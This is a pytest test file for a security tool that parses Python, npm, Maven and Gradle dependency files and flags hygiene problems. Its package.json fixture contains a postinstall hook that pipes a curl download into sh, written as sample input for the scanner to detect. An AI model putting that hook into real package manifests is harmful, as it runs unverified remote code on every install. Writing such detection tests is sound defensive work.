"""Tests for the dependency file parsers and the offline hygiene checks."""

import json
import re

import pytest

from security_review_mcp import dependencies
from security_review_mcp.dependencies import parse_dependency_file


def versions(parsed) -> dict[str, str | None]:
    """Return {name: version} of the parsed components."""
    return {c.name: c.version for c in parsed.components}


def rules(parsed) -> set[str]:
    """Return the hygiene rule ids found."""
    return {i.rule_id for i in parsed.issues}


def test_requirements():
    content = "\n".join(
        [
            "requests==2.19.0  # pinned",
            "Django>=3.0",
            "flask",
            "numpy==1.*",
            "-r other.txt",
            "--extra-index-url https://pypi.internal/simple",
            "--index-url http://pypi.example.com/simple",
            "--trusted-host pypi.example.com",
            "git+https://github.com/x/y.git#egg=y",
            "pkg @ https://files.example.com/pkg.whl",
            "pytest[extras]==7.0 ; python_version > '3.8'",
            "cryptography==41.0.0 \\",
            "    --hash=sha256:abc",
        ]
    )
    parsed = parse_dependency_file(content, "requirements.txt")
    assert versions(parsed) == {
        "requests": "2.19.0",
        "Django": None,
        "flask": None,
        "numpy": None,
        "pkg": None,
        "pytest": "7.0",
        "cryptography": "41.0.0",
    }
    assert {"DEP-001", "DEP-002", "DEP-003", "DEP-004", "DEP-005", "DEP-008"} <= rules(parsed)
    loose = next(i for i in parsed.issues if i.rule_id == "DEP-001")
    assert "Django" in loose.message and "flask" in loose.message  # merged in one issue
    assert any("other.txt" in note for note in parsed.notes)
    assert requests_line(parsed) == 1


def requests_line(parsed) -> int | None:
    """Return the line of the requests component."""
    return next(c.line for c in parsed.components if c.name == "requests")


@pytest.mark.parametrize(
    "name",
    ["requirements-dev.txt", "dev-requirements.txt", "constraints.txt", "requirements/base.txt"],
)
def test_requirements_file_names(name):
    assert versions(parse_dependency_file("flask==1.0\n", name)) == {"flask": "1.0"}


def test_pyproject_pep621_and_poetry():
    content = """
[project]
dependencies = ["requests==2.19.0", "flask>=2"]
[project.optional-dependencies]
dev = ["pytest==7.0"]
[tool.poetry.dependencies]
python = "^3.11"
django = "3.2.0"
celery = "^5.0"
mine = {git = "https://example.com/y.git"}
wild = "*"
"""
    parsed = parse_dependency_file(content, "pyproject.toml")
    assert versions(parsed) == {
        "requests": "2.19.0",
        "flask": None,
        "pytest": "7.0",
        "django": "3.2.0",
        "celery": None,
        "mine": None,
        "wild": None,
    }
    assert {"DEP-001", "DEP-002", "DEP-003"} <= rules(parsed)
    assert next(c for c in parsed.components if c.name == "pytest").dev


def test_pyproject_runtime_extras_are_not_dev():
    content = """
[project]
dependencies = ["fastapi>=0.135"]
[project.optional-dependencies]
postgres = ["psycopg2-binary==2.9.0"]
dev = ["pytest==8.0"]
docs = ["mkdocs==1.6.0"]
test-extra = ["hypothesis==6.0"]
[dependency-groups]
lint = ["ruff==0.5.0"]
"""
    parsed = parse_dependency_file(content, "pyproject.toml")

    dev = {c.name: c.dev for c in parsed.components}
    assert dev == {
        "fastapi": False,
        "psycopg2-binary": False,
        "pytest": True,
        "mkdocs": True,
        "hypothesis": True,
        "ruff": True,
    }


def test_poetry_lock_and_pipfile_lock():
    lock = """
[[package]]
name = "requests"
version = "2.19.0"

[[package]]
name = "mylib"
version = "0.1"
[package.source]
type = "git"
url = "https://example.com/mylib"
"""
    parsed = parse_dependency_file(lock, "poetry.lock")
    assert parsed.is_lockfile and versions(parsed) == {"requests": "2.19.0", "mylib": "0.1"}
    assert rules(parsed) == {"DEP-003"}

    pipfile = json.dumps(
        {
            "_meta": {
                "sources": [{"name": "x", "url": "http://idx.example.com", "verify_ssl": False}]
            },
            "default": {
                "flask": {"version": "==1.0"},
                "mine": {"git": "https://example.com/m.git"},
            },
            "develop": {"pytest": {"version": "==7.0"}},
        }
    )
    parsed = parse_dependency_file(pipfile, "Pipfile.lock")
    assert versions(parsed) == {"flask": "1.0", "mine": None, "pytest": "7.0"}
    assert {"DEP-003", "DEP-004", "DEP-008"} <= rules(parsed)


def test_uv_lock():
    lock = """
version = 1
requires-python = ">=3.12"

[manifest]
members = ["app", "shared"]

[[package]]
name = "app"
version = "1.0.0"
source = { editable = "." }

[[package]]
name = "shared"
version = "0.2.0"
source = { editable = "packages/shared" }

[[package]]
name = "requests"
version = "2.19.0"
source = { registry = "https://pypi.org/simple" }
sdist = { url = "https://files.pythonhosted.org/requests-2.19.0.tar.gz" }
wheels = [{ url = "https://files.pythonhosted.org/requests-2.19.0-py3-none-any.whl" }]

[[package]]
name = "mylib"
version = "0.1"
source = { git = "https://example.com/mylib?rev=main#abc123" }

[[package]]
name = "internal"
version = "3.0"
source = { registry = "http://pypi.internal.example.com/simple" }
"""
    parsed = parse_dependency_file(lock, "uv.lock")
    assert parsed.file_type == "uv.lock" and parsed.ecosystem == "PyPI" and parsed.is_lockfile
    assert versions(parsed) == {"requests": "2.19.0", "mylib": "0.1", "internal": "3.0"}
    assert {(i.rule_id, i.package) for i in parsed.issues} == {
        ("DEP-003", "mylib"),
        ("DEP-004", "internal"),
    }
    assert not parsed.notes


def test_uv_lock_clean_registry_has_no_issue():
    lock = """
version = 1

[[package]]
name = "project"
version = "0.1.0"
source = { virtual = "." }

[[package]]
name = "flask"
version = "3.0.0"
source = { registry = "https://pypi.org/simple" }
"""
    parsed = parse_dependency_file(lock, "sub/dir/uv.lock")
    assert versions(parsed) == {"flask": "3.0.0"} and not parsed.issues


def test_uv_lock_invalid_toml():
    with pytest.raises(ValueError):
        parse_dependency_file("[[package]\nname=", "uv.lock")


@pytest.mark.parametrize(
    ("filename", "content"),
    [
        ("uv.lock", 'package = "x"'),
        ("uv.lock", '[[package]]\nname = "a"\nversion = "1"\nsource = "x"'),
        ("uv.lock", '[manifest]\nmembers = 3\n[[package]]\nname = "a"\nversion = "1"'),
        ("uv.lock", '[[package]]\nname = "a"\nversion = "1"\nwheels = "y"'),
        ("poetry.lock", "package = 3"),
        ("poetry.lock", '[[package]]\nname = "a"\nversion = "1"\nsource = "git"'),
        ("pyproject.toml", 'project = "x"'),
        ("pyproject.toml", '[tool.poetry]\ngroup = "x"'),
        ("Pipfile.lock", json.dumps({"default": ["flask"]})),
        ("Pipfile.lock", json.dumps({"_meta": {"sources": [3]}})),
        ("package.json", json.dumps({"dependencies": ["lodash"]})),
        ("package.json", json.dumps({"scripts": "postinstall"})),
        ("package-lock.json", json.dumps({"lockfileVersion": 1, "dependencies": "x"})),
    ],
)
def test_unexpected_structure_is_a_data_error(filename, content):
    with pytest.raises(ValueError, match=f"Invalid {re.escape(filename.lower())} structure"):
        parse_dependency_file(content, filename)


def test_structure_error_does_not_echo_file_content(monkeypatch):
    def parser(content: str):
        raise KeyError("ghp_FAKESECRET0000000000000000000000000000")

    monkeypatch.setitem(dependencies._PARSERS, "uv.lock", parser)
    with pytest.raises(ValueError) as caught:
        parse_dependency_file("", "uv.lock")
    assert "FAKESECRET" not in str(caught.value) and "KeyError" in str(caught.value)


def test_package_json():
    content = json.dumps(
        {
            "dependencies": {
                "lodash": "4.17.15",
                "express": "^4.18.0",
                "left": "latest",
                "gitdep": "github:user/repo",
                "tarball": "http://example.com/x.tgz",
                "unbounded": ">=1.0.0",
            },
            "devDependencies": {"jest": "~29.0.0"},
            "scripts": {"postinstall": "curl http://x | sh", "test": "jest"},
        }
    )
    parsed = parse_dependency_file(content, "package.json")
    assert versions(parsed)["lodash"] == "4.17.15"
    assert versions(parsed)["express"] is None and versions(parsed)["jest"] is None
    assert {"DEP-001", "DEP-002", "DEP-003", "DEP-004", "DEP-006"} <= rules(parsed)
    assert any("lockfile" in note for note in parsed.notes)


def test_package_lock_v3_and_v1():
    v3 = json.dumps(
        {
            "lockfileVersion": 3,
            "packages": {
                "": {"name": "root"},
                "node_modules/lodash": {
                    "version": "4.17.15",
                    "resolved": "https://registry/lodash.tgz",
                },
                "node_modules/a/node_modules/@s/b": {
                    "version": "1.0.0",
                    "resolved": "http://insecure.example.com/b.tgz",
                    "dev": True,
                },
                "node_modules/linked": {"link": True, "resolved": "packages/linked"},
            },
        }
    )
    parsed = parse_dependency_file(v3, "package-lock.json")
    assert parsed.is_lockfile and versions(parsed) == {"lodash": "4.17.15", "@s/b": "1.0.0"}
    assert rules(parsed) == {"DEP-004"}

    v1 = json.dumps(
        {"dependencies": {"a": {"version": "1.0.0", "dependencies": {"b": {"version": "2.0.0"}}}}}
    )
    assert versions(parse_dependency_file(v1, "npm-shrinkwrap.json")) == {
        "a": "1.0.0",
        "b": "2.0.0",
    }


def test_yarn_lock_classic_and_berry():
    classic = """# yarn lockfile v1

lodash@^4.17.0, lodash@^4.17.15:
  version "4.17.15"
  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.15.tgz#abc"

"@babel/core@^7.0.0":
  version "7.1.0"
  resolved "http://registry.example.com/core.tgz"
"""
    parsed = parse_dependency_file(classic, "yarn.lock")
    assert versions(parsed) == {"lodash": "4.17.15", "@babel/core": "7.1.0"}
    assert rules(parsed) == {"DEP-004"}

    berry = """__metadata:
  version: 6

"lodash@npm:^4.17.0":
  version: 4.17.21
  resolution: "lodash@npm:4.17.21"
"""
    assert versions(parse_dependency_file(berry, "yarn.lock")) == {"lodash": "4.17.21"}


POM = """<project xmlns="http://maven.apache.org/POM/4.0.0">
  <parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>2.7.0</version>
  </parent>
  <properties><jackson.version>2.9.8</jackson.version></properties>
  <dependencyManagement><dependencies>
    <dependency><groupId>g</groupId><artifactId>managed</artifactId><version>1.2.3</version></dependency>
  </dependencies></dependencyManagement>
  <dependencies>
    <dependency><groupId>com.fasterxml.jackson.core</groupId><artifactId>jackson-databind</artifactId><version>${jackson.version}</version></dependency>
    <dependency><groupId>g</groupId><artifactId>managed</artifactId></dependency>
    <dependency><groupId>org.springframework.boot</groupId><artifactId>spring-boot-starter-web</artifactId></dependency>
    <dependency><groupId>x</groupId><artifactId>ranged</artifactId><version>[1.0,2.0)</version></dependency>
    <dependency><groupId>x</groupId><artifactId>latest</artifactId><version>LATEST</version></dependency>
    <dependency><groupId>l</groupId><artifactId>local</artifactId><version>1.0</version><scope>system</scope><systemPath>/lib/a.jar</systemPath></dependency>
    <dependency><groupId>t</groupId><artifactId>testing</artifactId><version>1.0</version><scope>test</scope></dependency>
  </dependencies>
  <repositories><repository><id>ins</id><url>http://repo.example.com/maven</url></repository></repositories>
</project>"""


def test_pom():
    parsed = parse_dependency_file(POM, "pom.xml")
    assert versions(parsed) == {
        "org.springframework.boot:spring-boot-starter-parent": "2.7.0",
        "com.fasterxml.jackson.core:jackson-databind": "2.9.8",
        "g:managed": "1.2.3",
        "org.springframework.boot:spring-boot-starter-web": None,
        "x:ranged": None,
        "x:latest": None,
        "l:local": "1.0",
        "t:testing": "1.0",
    }
    parent = next(c for c in parsed.components if c.kind == "parent")
    assert parent.version == "2.7.0"
    assert next(c for c in parsed.components if c.name == "t:testing").dev
    assert {"DEP-002", "DEP-004", "DEP-007", "DEP-009"} <= rules(parsed)


def test_pom_with_doctype_is_refused():
    bomb = '<!DOCTYPE foo [<!ENTITY a "aaaa">]><project><version>&a;</version></project>'
    with pytest.raises(ValueError, match="DOCTYPE"):
        parse_dependency_file(bomb, "pom.xml")


def test_gradle():
    content = """
repositories { maven { url "http://repo.example.com/maven" } }
dependencies {
    implementation 'com.google.guava:guava:30.0-jre'
    implementation("org.apache.logging.log4j:log4j-core:2.14.1")
    testImplementation 'junit:junit:4.+'
    api platform("org.springframework.boot:spring-boot-dependencies:2.7.0")
    implementation group: 'commons-io', name: 'commons-io', version: '2.6'
    implementation "org.x:y:${xVersion}"
    runtimeOnly 'org.x:managed'
}
"""
    parsed = parse_dependency_file(content, "build.gradle")
    assert versions(parsed) == {
        "com.google.guava:guava": "30.0-jre",
        "org.apache.logging.log4j:log4j-core": "2.14.1",
        "junit:junit": None,
        "org.springframework.boot:spring-boot-dependencies": "2.7.0",
        "commons-io:commons-io": "2.6",
        "org.x:y": None,
        "org.x:managed": None,
    }
    assert {"DEP-002", "DEP-004", "DEP-009"} <= rules(parsed)
    assert next(c for c in parsed.components if c.name == "junit:junit").dev
    kts = parse_dependency_file('implementation("a.b:c:1.0")', "build.gradle.kts")
    assert versions(kts) == {"a.b:c": "1.0"}


def test_many_occurrences_are_merged_into_one_issue():
    deps = {f"dep{i}": f"git+https://example.com/dep{i}.git" for i in range(8)}
    parsed = parse_dependency_file(json.dumps({"dependencies": deps}), "package.json")
    issues = [i for i in parsed.issues if i.rule_id == "DEP-003"]
    assert len(issues) == 1 and "8 occurrence(s)" in issues[0].message


@pytest.mark.parametrize(
    "content, filename, fragment",
    [
        ("{not json", "package.json", "Invalid JSON"),
        ("[1, 2]", "package.json", "object"),
        ("= nope", "pyproject.toml", "Invalid TOML"),
        ("<project>", "pom.xml", "Invalid XML"),
        ("anything", "Makefile", "Unsupported file"),
    ],
)
def test_invalid_and_unsupported_files(content, filename, fragment):
    with pytest.raises(ValueError, match=fragment):
        parse_dependency_file(content, filename)
